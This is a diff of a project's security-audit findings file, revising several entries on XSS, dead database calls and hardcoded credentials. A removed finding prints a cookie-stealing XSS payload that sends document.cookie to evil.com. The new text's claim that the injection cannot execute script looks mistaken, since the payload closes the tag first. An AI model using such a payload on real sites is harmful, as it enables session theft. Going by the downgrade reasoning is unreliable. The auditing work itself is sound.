@@ -23,25 +23,17 @@ When a finding is fixed: strike it through and add a `FIXED in commit <sha>` not
 
 Historical damage scope: exactly 1 complete debate existed in production at fix time, so real-world rating inflation was minimal. Going forward, all new PvP debates are protected.
 
-### P5-SD-1. `api/challenge.html.js:20` — Stored XSS via unescaped `preview.topic` in OG description — **OPEN**
-**Phase 5 (Architectural Blindness), 2026-04-17.** `ogDesc` is set using raw `preview.topic` (line 20) instead of the already-HTML-escaped `topic` variable produced on line 13. Any user who can create a challenge can inject arbitrary script into the challenge link's Open Graph metadata, executing in every recipient's browser when the link is previewed or the page is loaded. One-token fix: replace `preview.topic` with `topic` on line 20.
+### ~~P5-SD-1~~ → **M-P5-SD-1. `api/challenge.html.js:20` — OG metadata injection via unescaped `preview.topic` — OPEN (MEDIUM)**
+**Phase 5 (Architectural Blindness), 2026-04-17. Severity downgraded HIGH→MEDIUM after independent code review 2026-04-17.** `ogDesc` uses raw `preview.topic` (line 20) instead of the already-HTML-escaped `topic` variable from line 13. This lands in a `<meta content="...">` attribute — browsers do not execute script injected into meta tag content, so Phase 5's XSS claim is incorrect. Actual impact: attacker can break the meta tag structure and control link-unfurl preview text shown in Slack/iMessage/Twitter. No script execution. Fix is still correct and cheap: replace `preview.topic` with `topic` on line 20.
 
-**Attack scenario:** Attacker creates a challenge with topic `"><script>document.location='https://evil.com/?c='+document.cookie</script>`. Victim opens the challenge link. Script executes in victim's browser with full session access.
+### ~~P5-BI-1~~ → **M-P5-BI-1. `src/pages/auto-debate.vote.ts:55` — Dead RPC call to dropped `cast_auto_debate_vote` — OPEN (MEDIUM)**
+**Phase 5 (Architectural Blindness), 2026-04-17. Severity downgraded HIGH→MEDIUM after independent code review 2026-04-17.** `cast_auto_debate_vote` was dropped in S249 but the call site remains. However the catch block and error path both fall back to local optimistic rendering — no crash, no data corruption, no security issue. Votes simply don't persist; the feature is silently dead. Dead code cleanup, not an urgent fix.
 
-### P5-BI-1. `src/pages/auto-debate.vote.ts:55` — Dead RPC call to dropped `cast_auto_debate_vote` — **OPEN**
-**Phase 5 (Architectural Blindness), 2026-04-17.** `cast_auto_debate_vote` was dropped from production in S249 (LM-211) but the call site in `auto-debate.vote.ts:55` was not removed. All votes silently fail; the UI shows locally-incremented fake counts that are never persisted. Users believe they voted; no vote is recorded.
+### ~~P5-BI-2~~ → **M-P5-BI-2. `src/arena/arena-lobby.ts:199` — Dead table query against dropped `auto_debates` — OPEN (MEDIUM)**
+**Phase 5 (Architectural Blindness), 2026-04-17. Severity downgraded HIGH→MEDIUM after independent code review 2026-04-17.** The fallback path queries the dropped `auto_debates` table. The Postgres error is silent and the code falls through to placeholder card rendering — UI degrades gracefully, no crash. Off-peak users see placeholder cards instead of live content, with no error shown. Dead code removal, not urgent. Note: also supersedes M-Q3 (the `sb!` null assertion in the same branch).
 
-**Attack scenario:** Passive data integrity — all auto-debate vote data since S249 is fabricated. Leaderboard or outcome logic that reads vote counts sees zeros or stale pre-drop counts.
-
-### P5-BI-2. `src/arena/arena-lobby.ts:199` — Dead table query against dropped `auto_debates` — **OPEN**
-**Phase 5 (Architectural Blindness), 2026-04-17.** The lobby fallback path at line 199 queries the `auto_debates` table, which was dropped in the same S249 cleanup as the RPC above. During off-peak hours when the primary query returns empty, the fallback fires, throws a silent Postgres error, and the arena lobby renders empty placeholders with no user-visible error.
-
-**Attack scenario:** Off-peak reliability — during low-traffic periods the lobby appears broken to all users with no operator alert.
-
-### P5-EP-1. `src/config.ts:56-57` — Production credentials hardcoded as dev fallback — **OPEN**
-**Phase 5 (Architectural Blindness), 2026-04-17.** The Supabase URL and anon key are hardcoded as fallback values when `import.meta.env` variables are absent. Any `npm run dev` session without a `.env` file silently connects to live production. No staging environment exists, so this is the only environment. Every local dev session is a live production session by default.
-
-**Attack scenario:** Developer runs `npm run dev` on a fresh checkout without `.env`. Triggers real billing events, mutates real user data, fires real Supabase function invocations — no sandbox.
+### ~~P5-EP-1. `src/config.ts:56-57` — Production credentials hardcoded as dev fallback~~ — **FIXED 2026-04-17**
+**Phase 5 (Architectural Blindness), 2026-04-17. Fixed same day.** Hardcoded production Supabase URL and anon key replaced with `PASTE_YOUR_*` placeholders. `isPlaceholder()` now correctly detects missing `.env` and activates placeholder mode. `.env.example` added to repo root so fresh checkouts know what's required.
 
 ### ~~H-K1. `arena-feed-spec-chat.ts:171` — Stored XSS in report button onclick via single-quote injection~~ — **FIXED 2026-04-14 (commit 4166c1e)**
 **Batch 12R. FIRST HIGH SINCE H-A2. Unanimous 5/5 Stage 3 agents independently confirmed. Fixed same day.** The `renderMessages` function built a report button with an inline `onclick` attribute using double-quote outer delimiters and single-quote inner JS string delimiters, interpolating `encodeURIComponent(m.message)` into that JS string. `encodeURIComponent` does not encode the single-quote character (RFC 3986 unreserved), so a stored spectator chat message containing `'` terminated the JS string and allowed arbitrary JS execution in any spectator's browser that clicked the report button. `m.message` was fully user-controlled (spectator chat content), making this a stored XSS with worm potential.
